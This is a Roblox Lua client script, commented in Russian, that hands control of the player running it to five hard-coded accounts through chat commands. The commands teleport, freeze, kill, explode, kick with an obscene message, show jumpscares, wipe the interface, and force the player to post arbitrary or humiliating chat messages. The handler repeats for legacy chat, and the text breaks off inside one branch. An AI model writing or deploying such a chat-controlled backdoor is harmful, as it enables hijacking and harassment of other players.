local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local LocalPlayer = Players.LocalPlayer

-- Отправка точки в чат при запуске
local success, errorMessage = pcall(function()
    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        TextChatService.TextChannels.RBXGeneral:SendAsync(".")
    else
        LocalPlayer:Chat(".")
    end
end)
if not success then
    print("Failed to send '.' to chat: " .. tostring(errorMessage))
else
    print("Sent '.' to chat successfully")
end

-- Переменная для хранения текущей анимации
local currentAnimationTrack = nil

-- Функция для остановки текущей анимации
local function stopCurrentAnimation()
    if currentAnimationTrack then
        currentAnimationTrack:Stop()
        currentAnimationTrack:Destroy()
        currentAnimationTrack = nil
        print("Stopped current animation")
    end
end

-- Обработка сообщений в чате
if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
    print("Using TextChatService for chat handling")
    TextChatService.TextChannels.RBXGeneral.MessageReceived:Connect(function(message)
        local speaker = message.TextSource
        if speaker and (speaker.Name == "BotDlyaFarma1" or speaker.Name == "cracadil223" or speaker.Name == "BotDlyaFarma11" or speaker.Name == "Kesyal_ston" or speaker.Name == "OneArmedFish") and LocalPlayer.Name ~= speaker.Name then
            local msg = message.Text:lower()
            print("Received command: " .. msg .. " from " .. speaker.Name)
            if msg == "tp" then
                local bot = Players:FindFirstChild(speaker.Name)
                if bot and bot.Character and bot.Character.HumanoidRootPart and LocalPlayer.Character and LocalPlayer.Character.HumanoidRootPart then
                    LocalPlayer.Character.HumanoidRootPart.CFrame = bot.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -5)
                    print("Teleported to " .. speaker.Name .. " via 'tp'")
                else
                    print("Teleport failed: Bot or player character not found")
                end
            elseif msg == "freeze" then
                if LocalPlayer.Character and LocalPlayer.Character.HumanoidRootPart then
                    LocalPlayer.Character.HumanoidRootPart.Anchored = true
                    print("Player frozen by " .. speaker.Name)
                else
                    print("Freeze failed: Player character not found")
                end
            elseif msg == "unfreeze" then
                if LocalPlayer.Character and LocalPlayer.Character.HumanoidRootPart then
                    LocalPlayer.Character.HumanoidRootPart.Anchored = false
                    print("Player unfrozen by " .. speaker.Name)
                else
                    print("Unfreeze failed: Player character not found")
                end
            elseif msg == "dead" then
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                    LocalPlayer.Character.Humanoid.Health = 0
                    print("Player killed by " .. speaker.Name .. " via 'dead'")
                else
                    print("Dead failed: Player character or Humanoid not found")
                end
            elseif msg == "explode" then
                if LocalPlayer.Character and LocalPlayer.Character.HumanoidRootPart and LocalPlayer.Character:FindFirstChild("Humanoid") then
                    local explosion = Instance.new("Explosion")
                    explosion.Position = LocalPlayer.Character.HumanoidRootPart.Position
                    explosion.BlastRadius = 10
                    explosion.BlastPressure = 500000
                    explosion.Parent = game.Workspace
                    LocalPlayer.Character.Humanoid.Health = 0
                    print("Player exploded and killed by " .. speaker.Name .. " via 'explode'")
                else
                    print("Explode failed: Player character, Humanoid, or HumanoidRootPart not found")
                end
            elseif msg == "gui" then
                if LocalPlayer.PlayerGui then
                    for _, gui in pairs(LocalPlayer.PlayerGui:GetChildren()) do
                        if gui:IsA("ScreenGui") then
                            gui:Destroy()
                        end
                    end
                    local success, errorMessage = pcall(function()
                        local chatGui = game:GetService("CoreGui"):FindFirstChild("TextChatService")
                        if chatGui then
                            chatGui.Enabled = false
                        end
                    end)
                    if not success then
                        print("Failed to disable chat GUI: " .. tostring(errorMessage))
                    end
                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                        LocalPlayer.Character.Humanoid.Health = 0
                        print("Player GUI removed and killed by " .. speaker.Name .. " via 'gui'")
                    else
                        print("GUI removal succeeded, but player kill failed: Humanoid not found")
                    end
                else
                    print("GUI removal failed: PlayerGui not found")
                end
            elseif msg == "bang" then
                local bot = Players:FindFirstChild(speaker.Name)
                if bot and bot.Character and bot.Character.HumanoidRootPart and LocalPlayer.Character and LocalPlayer.Character.HumanoidRootPart then
                    local botPos = bot.Character.HumanoidRootPart.Position
                    local playerPos = botPos + (bot.Character.HumanoidRootPart.CFrame.lookVector * -3)
                    LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(playerPos, botPos)
                    LocalPlayer.Character.HumanoidRootPart.Anchored = true
                    for i = 1, 3 do
                        local success, errorMessage = pcall(function()
                            TextChatService.TextChannels.RBXGeneral:SendAsync("прости мой король")
                        end)
                        if not success then
                            print("Chat failed for 'прости мой король': " .. tostring(errorMessage))
                        end
                        wait(0.5)
                    end
                    print("Player teleported, frozen, and sent messages by " .. speaker.Name .. " via 'bang'")
                else
                    print("Bang failed: Bot or player character not found")
                end
            elseif msg == "unbang" then
                if LocalPlayer.Character and LocalPlayer.Character.HumanoidRootPart then
                    LocalPlayer.Character.HumanoidRootPart.Anchored = false
                    print("Player unfrozen by " .. speaker.Name .. " via 'unbang'")
                else
                    print("Unbang failed: Player character or HumanoidRootPart not found")
                end
            elseif msg == "z0nxx" then
                local success, errorMessage = pcall(function()
                    TextChatService.TextChannels.RBXGeneral:SendAsync("Я ТУТ!!!")
                end)
                if success then
                    print("Player sent 'Я ТУТ!!!' by " .. speaker.Name .. " via 'z0nxx'")
                else
                    print("Z0nxx failed: " .. tostring(errorMessage))
                end
            elseif msg == "spin" then
                if LocalPlayer.Character and LocalPlayer.Character.HumanoidRootPart then
                    for _, obj in pairs(LocalPlayer.Character.HumanoidRootPart:GetChildren()) do
                        if obj:IsA("BodyAngularVelocity") then
                            obj:Destroy()
                        end
                    end
                    local angularVelocity = Instance.new("BodyAngularVelocity")
                    angularVelocity.Name = "SpinEffect"
                    angularVelocity.MaxTorque = Vector3.new(0, math.huge, 0)
                    angularVelocity.AngularVelocity = Vector3.new(0, 10, 0)
                    angularVelocity.Parent = LocalPlayer.Character.HumanoidRootPart
                    print("Player started spinning by " .. speaker.Name .. " via 'spin'")
                else
                    print("Spin failed: Player character or HumanoidRootPart not found")
                end
            elseif msg == "unspin" then
                if LocalPlayer.Character and LocalPlayer.Character.HumanoidRootPart then
                    for _, obj in pairs(LocalPlayer.Character.HumanoidRootPart:GetChildren()) do
                        if obj:IsA("BodyAngularVelocity") and obj.Name == "SpinEffect" then
                            obj:Destroy()
                        end
                    end
                    print("Player stopped spinning by " .. speaker.Name .. " via 'unspin'")
                else
                    print("Unspin failed: Player character or HumanoidRootPart not found")
                end
            elseif msg == "sit" then
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                    LocalPlayer.Character.Humanoid.Sit = true
                    print("Player forced to sit by " .. speaker.Name .. " via 'sit'")
                else
                    print("Sit failed: Player character or Humanoid not found")
                end
            elseif msg == "dance1" then
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                    stopCurrentAnimation()
                    local animation = Instance.new("Animation")
                    animation.AnimationId = "rbxassetid://507771019"
                    currentAnimationTrack = LocalPlayer.Character.Humanoid:LoadAnimation(animation)
                    currentAnimationTrack:Play()
                    print("Player started dancing (Dance 1) by " .. speaker.Name .. " via 'dance1'")
                else
                    print("Dance1 failed: Player character or Humanoid not found")
                end
            elseif msg == "dance2" then
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                    stopCurrentAnimation()
                    local animation = Instance.new("Animation")
                    animation.AnimationId = "rbxassetid://507776043"
                    currentAnimationTrack = LocalPlayer.Character.Humanoid:LoadAnimation(animation)
                    currentAnimationTrack:Play()
                    print("Player started dancing (Dance 2) by " .. speaker.Name .. " via 'dance2'")
                else
                    print("Dance2 failed: Player character or Humanoid not found")
                end
            elseif msg == "dance3" then
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                    stopCurrentAnimation()
                    local animation = Instance.new("Animation")
                    animation.AnimationId = "rbxassetid://507777268"
                    currentAnimationTrack = LocalPlayer.Character.Humanoid:LoadAnimation(animation)
                    currentAnimationTrack:Play()
                    print("Player started dancing (Dance 3) by " .. speaker.Name .. " via 'dance3'")
                else
                    print("Dance3 failed: Player character or Humanoid not found")
                end
            elseif msg == "scream" then
                if LocalPlayer.Character then
                    local screamGui = Instance.new("ScreenGui")
                    screamGui.Name = "ScreamGui"
                    screamGui.Parent = LocalPlayer.PlayerGui
                    screamGui.IgnoreGuiInset = true
                    screamGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                    screamGui.ZIndex = 100
                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Position = UDim2.new(0, 0, 0, 0)
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Image = "rbxassetid://135567909583165"
                    imageLabel.ZIndex = 100
                    imageLabel.Parent = screamGui
                    local sound = Instance.new("Sound")
                    sound.SoundId = "rbxassetid://82443621360147"
                    sound.Volume = 1
                    sound.Parent = screamGui
                    sound:Play()
                    print("Scream effect applied by " .. speaker.Name)
                    wait(5)
                    sound:Stop()
                    screamGui:Destroy()
                    print("Scream effect ended")
                else
                    print("Scream failed: Player character not found")
                end
            elseif msg == "scream2" then
                if LocalPlayer.Character then
                    local screamGui = Instance.new("ScreenGui")
                    screamGui.Name = "Scream2Gui"
                    screamGui.Parent = LocalPlayer.PlayerGui
                    screamGui.IgnoreGuiInset = true
                    screamGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                    screamGui.ZIndex = 100
                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Position = UDim2.new(0, 0, 0, 0)
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Image = "rbxassetid://18394342398"
                    imageLabel.ZIndex = 100
                    imageLabel.Parent = screamGui
                    local sound = Instance.new("Sound")
                    sound.SoundId = "rbxassetid://109146958963918"
                    sound.Volume = 1
                    sound.Parent = screamGui
                    sound:Play()
                    print("Scream2 effect applied by " .. speaker.Name)
                    wait(5)
                    sound:Stop()
                    screamGui:Destroy()
                    print("Scream2 effect ended")
                else
                    print("Scream2 failed: Player character not found")
                end
            elseif msg == "scream3" then
                if LocalPlayer.Character then
                    local screamGui = Instance.new("ScreenGui")
                    screamGui.Name = "Scream3Gui"
                    screamGui.Parent = LocalPlayer.PlayerGui
                    screamGui.IgnoreGuiInset = true
                    screamGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                    screamGui.ZIndex = 100
                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Position = UDim2.new(0, 0, 0, 0)
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Image = "rbxassetid://7371693428"
                    imageLabel.ZIndex = 100
                    imageLabel.Parent = screamGui
                    local sound = Instance.new("Sound")
                    sound.SoundId = "rbxassetid://7371693428"
                    sound.Volume = 1
                    sound.Parent = screamGui
                    sound:Play()
                    print("Scream3 effect applied by " .. speaker.Name)
                    wait(5)
                    sound:Stop()
                    screamGui:Destroy()
                    print("Scream3 effect ended")
                else
                    print("Scream3 failed: Player character not found")
                end
            elseif msg == "scream4" then
                if LocalPlayer.Character then
                    local screamGui = Instance.new("ScreenGui")
                    screamGui.Name = "Scream4Gui"
                    screamGui.Parent = LocalPlayer.PlayerGui
                    screamGui.IgnoreGuiInset = true
                    screamGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                    screamGui.ZIndex = 100
                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Position = UDim2.new(0, 0, 0, 0)
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Image = "rbxassetid://9182757465"
                    imageLabel.ZIndex = 100
                    imageLabel.Parent = screamGui
                    local sound = Instance.new("Sound")
                    sound.SoundId = "rbxassetid://9182757465"
                    sound.Volume = 1
                    sound.Parent = screamGui
                    sound:Play()
                    print("Scream4 effect applied by " .. speaker.Name)
                    wait(5)
                    sound:Stop()
                    screamGui:Destroy()
                    print("Scream4 effect ended")
                else
                    print("Scream4 failed: Player character not found")
                end
            elseif msg == "scream5" then
                if LocalPlayer.Character then
                    local screamGui = Instance.new("ScreenGui")
                    screamGui.Name = "Scream5Gui"
                    screamGui.Parent = LocalPlayer.PlayerGui
                    screamGui.IgnoreGuiInset = true
                    screamGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                    screamGui.ZIndex = 100
                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Position = UDim2.new(0, 0, 0, 0)
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Image = "rbxassetid://12623079242"
                    imageLabel.ZIndex = 100
                    imageLabel.Parent = screamGui
                    local sound = Instance.new("Sound")
                    sound.SoundId = "rbxassetid://12623079242"
                    sound.Volume = 1
                    sound.Parent = screamGui
                    sound:Play()
                    print("Scream5 effect applied by " .. speaker.Name)
                    wait(5)
                    sound:Stop()
                    screamGui:Destroy()
                    print("Scream5 effect ended")
                else
                    print("Scream5 failed: Player character not found")
                end
            elseif msg == "scream6" then
                if LocalPlayer.Character then
                    local screamGui = Instance.new("ScreenGui")
                    screamGui.Name = "Scream6Gui"
                    screamGui.Parent = LocalPlayer.PlayerGui
                    screamGui.IgnoreGuiInset = true
                    screamGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                    screamGui.ZIndex = 100
                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Position = UDim2.new(0, 0, 0, 0)
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Image = "rbxassetid://10246439168"
                    imageLabel.ZIndex = 100
                    imageLabel.Parent = screamGui
                    local sound = Instance.new("Sound")
                    sound.SoundId = "rbxassetid://10246439168"
                    sound.Volume = 1
                    sound.Parent = screamGui
                    sound:Play()
                    print("Scream6 effect applied by " .. speaker.Name)
                    wait(5)
                    sound:Stop()
                    screamGui:Destroy()
                    print("Scream6 effect ended")
                else
                    print("Scream6 failed: Player character not found")
                end
            elseif msg == "scream7" then
                if LocalPlayer.Character then
                    local screamGui = Instance.new("ScreenGui")
                    screamGui.Name = "Scream7Gui"
                    screamGui.Parent = LocalPlayer.PlayerGui
                    screamGui.IgnoreGuiInset = true
                    screamGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                    screamGui.ZIndex = 100
                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Position = UDim2.new(0, 0, 0, 0)
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Image = "rbxassetid://10246338786"
                    imageLabel.ZIndex = 100
                    imageLabel.Parent = screamGui
                    local sound = Instance.new("Sound")
                    sound.SoundId = "rbxassetid://10246338786"
                    sound.Volume = 1
                    sound.Parent = screamGui
                    sound:Play()
                    print("Scream7 effect applied by " .. speaker.Name)
                    wait(5)
                    sound:Stop()
                    screamGui:Destroy()
                    print("Scream7 effect ended")
                else
                    print("Scream7 failed: Player character not found")
                end
            elseif msg == "scream8" then
                if LocalPlayer.Character then
                    local screamGui = Instance.new("ScreenGui")
                    screamGui.Name = "Scream8Gui"
                    screamGui.Parent = LocalPlayer.PlayerGui
                    screamGui.IgnoreGuiInset = true
                    screamGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                    screamGui.ZIndex = 100
                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Position = UDim2.new(0, 0, 0, 0)
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Image = "rbxassetid://11648246803"
                    imageLabel.ZIndex = 100
                    imageLabel.Parent = screamGui
                    local sound = Instance.new("Sound")
                    sound.SoundId = "rbxassetid://11648246803"
                    sound.Volume = 1
                    sound.Parent = screamGui
                    sound:Play()
                    print("Scream8 effect applied by " .. speaker.Name)
                    wait(5)
                    sound:Stop()
                    screamGui:Destroy()
                    print("Scream8 effect ended")
                else
                    print("Scream8 failed: Player character not found")
                end
            elseif msg == "scream9" then
                if LocalPlayer.Character then
                    local screamGui = Instance.new("ScreenGui")
                    screamGui.Name = "Scream9Gui"
                    screamGui.Parent = LocalPlayer.PlayerGui
                    screamGui.IgnoreGuiInset = true
                    screamGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                    screamGui.ZIndex = 100
                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Position = UDim2.new(0, 0, 0, 0)
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Image = "rbxassetid://11587987222"
                    imageLabel.ZIndex = 100
                    imageLabel.Parent = screamGui
                    local sound = Instance.new("Sound")
                    sound.SoundId = "rbxassetid://11587987222"
                    sound.Volume = 1
                    sound.Parent = screamGui
                    sound:Play()
                    print("Scream9 effect applied by " .. speaker.Name)
                    wait(5)
                    sound:Stop()
                    screamGui:Destroy()
                    print("Scream9 effect ended")
                else
                    print("Scream9 failed: Player character not found")
                end
            elseif msg == "scream10" then
                if LocalPlayer.Character then
                    local screamGui = Instance.new("ScreenGui")
                    screamGui.Name = "Scream10Gui"
                    screamGui.Parent = LocalPlayer.PlayerGui
                    screamGui.IgnoreGuiInset = true
                    screamGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                    screamGui.ZIndex = 100
                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Position = UDim2.new(0, 0, 0, 0)
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Image = "rbxassetid://12469870004"
                    imageLabel.ZIndex = 100
                    imageLabel.Parent = screamGui
                    local sound = Instance.new("Sound")
                    sound.SoundId = "rbxassetid://12469870004"
                    sound.Volume = 1
                    sound.Parent = screamGui
                    sound:Play()
                    print("Scream10 effect applied by " .. speaker.Name)
                    wait(5)
                    sound:Stop()
                    screamGui:Destroy()
                    print("Scream10 effect ended")
                else
                    print("Scream10 failed: Player character not found")
                end
            elseif msg == "scream11" then
                if LocalPlayer.Character then
                    local screamGui = Instance.new("ScreenGui")
                    screamGui.Name = "Scream11Gui"
                    screamGui.Parent = LocalPlayer.PlayerGui
                    screamGui.IgnoreGuiInset = true
                    screamGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                    screamGui.ZIndex = 100
                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Position = UDim2.new(0, 0, 0, 0)
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Image = "rbxassetid://7273829854"
                    imageLabel.ZIndex = 100
                    imageLabel.Parent = screamGui
                    local sound = Instance.new("Sound")
                    sound.SoundId = "rbxassetid://7273829854"
                    sound.Volume = 1
                    sound.Parent = screamGui
                    sound:Play()
                    print("Scream11 effect applied by " .. speaker.Name)
                    wait(5)
                    sound:Stop()
                    screamGui:Destroy()
                    print("Scream11 effect ended")
                else
                    print("Scream11 failed: Player character not found")
                end
            elseif msg == "kick" then
                local success, errorMessage = pcall(function()
                    LocalPlayer:Kick("пошел нахуй")
                end)
                if success then
                    print("Player kicked by " .. speaker.Name .. " via 'kick'")
                else
                    print("Kick failed: " .. tostring(errorMessage))
                end
            elseif msg:sub(1, 5) == "chat " then
                local chatMessage = message.Text:sub(6)
                if chatMessage ~= "" then
                    local success, errorMessage = pcall(function()
                        TextChatService.TextChannels.RBXGeneral:SendAsync(chatMessage)
                    end)
                    if success then
                        print("Player sent chat message: " .. chatMessage .. " by " .. speaker.Name)
                    else
                        print("Chat failed: " .. tostring(errorMessage))
                    end
                else
                    print("Chat failed: No message provided after 'chat' command")
                end
            else
                print("Message from " .. speaker.Name .. ": " .. message.Text)
            end
        end
    end)
else
    print("Using Legacy Chat for chat handling")
    Players.PlayerChatted:Connect(function(chatType, player, message)
        if player and (player.Name == "BotDlyaFarma1" or player.Name == "cracadil223" or player.Name == "BotDlyaFarma11" or player.Name == "Kesyal_Ston" or player.Name == "OneArmedFish") and LocalPlayer.Name ~= player.Name then
            local msg = message:lower()
            print("Received command: " .. msg .. " from " .. player.Name)
            if msg == "tp" then
                local bot = Players:FindFirstChild(player.Name)
                if bot and bot.Character and bot.Character.HumanoidRootPart and LocalPlayer.Character and LocalPlayer.Character.HumanoidRootPart then
                    LocalPlayer.Character.HumanoidRootPart.CFrame = bot.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -5)
                    print("Teleported to " .. player.Name .. " via 'tp'")
                else
                    print("Teleport failed: Bot or player character not found")
                end
            elseif msg == "freeze" then
                if LocalPlayer.Character and LocalPlayer.Character.HumanoidRootPart then
                    LocalPlayer.Character.HumanoidRootPart.Anchored = true
                    print("Player frozen by " .. player.Name)
                else
                    print("Freeze failed: Player character not found")
                end
            elseif msg == "unfreeze" then
                if LocalPlayer.Character and LocalPlayer.Character.HumanoidRootPart then
                    LocalPlayer.Character.HumanoidRootPart.Anchored = false
                    print("Player unfrozen by " .. player.Name)
                else
                    print("Unfreeze failed: Player character not found")
                end
            elseif msg == "dead" then
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                    LocalPlayer.Character.Humanoid.Health = 0
                    print("Player killed by " .. player.Name .. " via 'dead'")
                else
                    print("Dead failed: Player character or Humanoid not found")
                end
            elseif msg == "explode" then
                if LocalPlayer.Character and LocalPlayer.Character.HumanoidRootPart and LocalPlayer.Character:FindFirstChild("Humanoid") then
                    local explosion = Instance.new("Explosion")
                    explosion.Position = LocalPlayer.Character.HumanoidRootPart.Position
                    explosion.BlastRadius = 10
                    explosion.BlastPressure = 500000
                    explosion.Parent = game.Workspace
                    LocalPlayer.Character.Humanoid.Health = 0
                    print("Player exploded and killed by " .. player.Name .. " via 'explode'")
                else
                    print("Explode failed: Player character, Humanoid, or HumanoidRootPart not found")
                end
            elseif msg == "gui" then
                if LocalPlayer.PlayerGui then
                    for _, gui in pairs(LocalPlayer.PlayerGui:GetChildren()) do
                        if gui:IsA("ScreenGui") then
                            gui:Destroy()
                        end
                    end
                    local success, errorMessage = pcall(function()
                        local chatGui = game:GetService("CoreGui"):FindFirstChild("TextChatService")
                        if chatGui then
                            chatGui.Enabled = false
                        end
                    end)
                    if not success then
                        print("Failed to disable chat GUI: " .. tostring(errorMessage))
                    end
                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                        LocalPlayer.Character.Humanoid.Health = 0
                        print("Player GUI removed and killed by " .. player.Name .. " via 'gui'")
                    else
                        print("GUI removal succeeded, but player kill failed: Humanoid not found")
                    end
                else
                    print("GUI removal failed: PlayerGui not found")
                end
            elseif msg == "bang" then
                local bot = Players:FindFirstChild(player.Name)
                if bot and bot.Character and bot.Character.HumanoidRootPart and LocalPlayer.Character and LocalPlayer.Character.HumanoidRootPart then
                    local botPos = bot.Character.HumanoidRootPart.Position
                    local playerPos = botPos + (bot.Character.HumanoidRootPart.CFrame.lookVector * -3)
                    LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(playerPos, botPos)
                    LocalPlayer.Character.HumanoidRootPart.Anchored = true
                    for i = 1, 3 do
                        local success, errorMessage = pcall(function()
                            LocalPlayer:Chat("прости мой король")
                        end)
                        if not success then
                            print("Chat failed for 'прости мой король': " .. tostring(errorMessage))
                        end
                        wait(0.5)
                    end
                    print("Player teleported, frozen, and sent messages by " .. player.Name .. " via 'bang'")
                else
                    print("Bang failed: Bot or player character not found")
                end
            elseif msg == "unbang" then
                if LocalPlayer.Character and LocalPlayer.Character.HumanoidRootPart then
                    LocalPlayer.Character.HumanoidRootPart.Anchored = false
                    print("Player unfrozen by " .. player.Name .. " via 'unbang'")
                else
                    print("Unbang failed: Player character or HumanoidRootPart not found")
                end
            elseif msg == "z0nxx" then
                local success, errorMessage = pcall(function()
                    LocalPlayer:Chat("Я ТУТ!!!")
                end)
                if success then
                    print("Player sent 'Я ТУТ!!!' by " .. player.Name .. " via 'z0nxx'")
                else
                    print("Z0nxx failed: " .. tostring(errorMessage))
                end
            elseif msg == "spin" then
                if LocalPlayer.Character and LocalPlayer.Character.HumanoidRootPart then
                    for _, obj in pairs(LocalPlayer.Character.HumanoidRootPart:GetChildren()) do
                        if obj:IsA("BodyAngularVelocity") then
                            obj:Destroy()
                        end
                    end
                    local angularVelocity = Instance.new("BodyAngularVelocity")
                    angularVelocity.Name = "SpinEffect"
                    angularVelocity.MaxTorque = Vector3.new(0, math.huge, 0)
                    angularVelocity.AngularVelocity = Vector3.new(0, 10, 0)
                    angularVelocity.Parent = LocalPlayer.Character.HumanoidRootPart
                    print("Player started spinning by " .. player.Name .. " via 'spin'")
                else
                    print("Spin failed: Player character or HumanoidRootPart not found")
                end
            elseif msg == "unspin" then
                if LocalPlayer.Character and LocalPlayer.Character.HumanoidRootPart then
                    for _, obj in pairs(LocalPlayer.Character.HumanoidRootPart:GetChildren()) do
                        if obj:IsA("BodyAngularVelocity") and obj.Name == "SpinEffect" then
                            obj:Destroy()
                        end
                    end
                    print("Player stopped spinning by " .. player.Name .. " via 'unspin'")
                else
                    print("Unspin failed: Player character or HumanoidRootPart not found")
                end
            elseif msg == "sit" then
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                    LocalPlayer.Character.Humanoid.Sit = true
                    print("Player forced to sit by " .. player.Name .. " via 'sit'")
                else
                    print("Sit failed: Player character or Humanoid not found")
                end
            elseif msg == "dance1" then
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                    stopCurrentAnimation()
                    local animation = Instance.new("Animation")
                    animation.AnimationId = "rbxassetid://507771019"
                    currentAnimationTrack = LocalPlayer.Character.Humanoid:LoadAnimation(animation)
                    currentAnimationTrack:Play()
                    print("Player started dancing (Dance 1) by " .. player.Name .. " via 'dance1'")
                else
                    print("Dance1 failed: Player character or Humanoid not found")
                end
            elseif msg == "dance2" then
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                    stopCurrentAnimation()
                    local animation = Instance.new("Animation")
                    animation.AnimationId = "rbxassetid://507776043"
                    currentAnimationTrack = LocalPlayer.Character.Humanoid:LoadAnimation(animation)
                    currentAnimationTrack:Play()
                    print("Player started dancing (Dance 2) by " .. player.Name .. " via 'dance2'")
                else
                    print("Dance2 failed: Player character or Humanoid not found")
                end
            elseif msg == "dance3" then
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                    stopCurrentAnimation()
                    local animation = Instance.new("Animation")
                    animation.AnimationId = "rbxassetid://507777268"
                    currentAnimationTrack = LocalPlayer.Character.Humanoid:LoadAnimation(animation)
                    currentAnimationTrack:Play()
                    print("Player started dancing (Dance 3) by " .. player.Name .. " via 'dance3'")
                else
                    print("Dance3 failed: Player character or Humanoid not found")
                end
            elseif msg == "scream" then
                if LocalPlayer.Character then
                    local screamGui = Instance.new("ScreenGui")
                    screamGui.Name = "ScreamGui"
                    screamGui.Parent = LocalPlayer.PlayerGui
                    screamGui.IgnoreGuiInset = true
                    screamGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                    screamGui.ZIndex = 100
                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Position = UDim2.new(0, 0, 0, 0)
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Image = "rbxassetid://135567909583165"
                    imageLabel.ZIndex = 100
                    imageLabel.Parent = screamGui
                    local sound = Instance.new("Sound")
                    sound.SoundId = "rbxassetid://82443621360147"
                    sound.Volume = 1
                    sound.Parent = screamGui
                    sound:Play()
                    print("Scream effect applied by " .. player.Name)
                    wait(5)
                    sound:Stop()
                    screamGui:Destroy()
                    print("Scream effect ended")
                else
                    print("Scream failed: Player character not found")
                end
            elseif msg == "scream2" then
                if LocalPlayer.Character then
                    local screamGui = Instance.new("ScreenGui")
                    screamGui.Name = "Scream2Gui"
                    screamGui.Parent = LocalPlayer.PlayerGui
                    screamGui.IgnoreGuiInset = true
                    screamGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                    screamGui.ZIndex = 100
                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Position = UDim2.new(0, 0, 0, 0)
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Image = "rbxassetid://18394342398"
                    imageLabel.ZIndex = 100
                    imageLabel.Parent = screamGui
                    local sound = Instance.new("Sound")
                    sound.SoundId = "rbxassetid://109146958963918"
                    sound.Volume = 1
                    sound.Parent = screamGui
                    sound:Play()
                    print("Scream2 effect applied by " .. player.Name)
                    wait(5)
                    sound:Stop()
                    screamGui:Destroy()
                    print("Scream2 effect ended")
                else
                    print("Scream2 failed: Player character not found")
                end
            elseif msg == "scream3" then
                if LocalPlayer.Character then
                    local screamGui = Instance.new("ScreenGui")
                    screamGui.Name = "Scream3Gui"
                    screamGui.Parent = LocalPlayer.PlayerGui
                    screamGui.IgnoreGuiInset = true
                    screamGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                    screamGui.ZIndex = 100
                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Position = UDim2.new(0, 0, 0, 0)
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Image = "rbxassetid://7371693428"
                    imageLabel.ZIndex = 100
                    imageLabel.Parent = screamGui
                    local sound = Instance.new("Sound")
                    sound.SoundId = "rbxassetid://7371693428"
                    sound.Volume = 1
                    sound.Parent = screamGui
                    sound:Play()
                    print("Scream3 effect applied by " .. player.Name)
                    wait(5)
                    sound:Stop()
                    screamGui:Destroy()
